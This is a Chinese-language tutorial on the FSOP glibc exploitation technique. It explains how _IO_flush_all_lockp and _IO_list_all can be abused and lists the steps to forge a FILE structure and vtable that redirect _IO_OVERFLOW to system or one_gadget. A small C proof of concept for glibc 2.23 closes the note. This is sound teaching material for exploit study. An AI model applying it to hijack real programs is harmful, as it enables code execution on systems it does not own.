# FSOP

### 简介

`FSOP` 的核心思想就是劫持`_IO_list_all` 的值来伪造链表和其中的`_IO_FILE` 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。`FSOP` 选择的触发方法是调用`_IO_flush_all_lockp`，这个函数会刷新`_IO_list_all `链表中所有项的文件流，相当于对每个 `FILE` 调用 `fflush`，也对应着会调用`_IO_FILE_plus.vtable` 中的`_IO_overflow`。

#### 关于 `_IO_flush_all_lockp`

`_IOflush_all_lockp` 的核心功能是刷新所有已经打开的文件流的缓冲区道内核或底层存储设备

##### **核心功能**

1. **遍历链表与刷新缓冲区**
   `_IO_flush_all_lockp` 会从全局变量 `_IO_list_all` 开始遍历所有 `_IO_FILE` 结构体组成的链表，对每个文件流调用其虚表（vtable）中的 `_IO_OVERFLOW` 函数，完成缓冲区的刷新操作
   - **刷新逻辑**：相当于对每个文件流隐式调用 `fflush`，确保未写入的数据（如 `stdout` 的缓冲区内容）被提交到内核。
2. **调用虚函数 `_IO_OVERFLOW`**
   每个文件流的刷新操作通过虚表中的 `_IO_OVERFLOW` 实现。例如，标准输出流 `stdout` 的 `_IO_OVERFLOW` 最终会调用 `write` 系统调用，将数据写入文件描述符。

##### 触发场景

`_IO_flush_all_lockp` 在以下三种场景下会被自动调用

1. **程序调用 `exit()` 函数**
   在程序正常退出时，确保所有未刷新的数据被写入。
2. **`main` 函数返回**
   当主函数执行完毕返回时，隐式调用 `exit()`。
3. **程序执行 `abort()` 流程**
   当 GLIBC 检测到内存错误（如堆损坏）或其他致命错误时，会触发 `abort()`，进而调用此函数。

##### 需满足条件

- fp->_mode <= 0
- fp->_IO_write_ptr > fp->_IO_write_base

```C
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
          {
               result = EOF;
          }
```

### 攻击利用

1. 伪造`fake_IO_list_all`。
2. 为了触发`_IO_OVERFLOW`，设置`_mode`为 0,设置writeptr > writebase。
3. 伪造虚表vtable，将`_IO_OVERFLOW` 设置为`system`或`one_gadget`的地址。
4. 篡改`IO_list_all `中的地址，至`fake_IO_list_all`。
5. 执行exit，或让内存错误，或等main函数返回。
6. 触发`_IO_flush_all_lockp`进行利用。

#### POC

glibc 2.23版本

```C
#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
#define vtable_offset 0xd8

int main(void)
{
    void *ptr;
    long long *list_all_ptr;

    ptr=malloc(0x200);

    *(long long*)((long long)ptr+mode_offset)=0x0;
    *(long long*)((long long)ptr+writeptr_offset)=0x1;
    *(long long*)((long long)ptr+writebase_offset)=0x0;
    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);
    *(long long*)((long long)ptr+0x100+24)=0x41414141;
    list_all_ptr=(long long *)_IO_list_all;

    list_all_ptr[0]=ptr;

    exit(0);
}
```

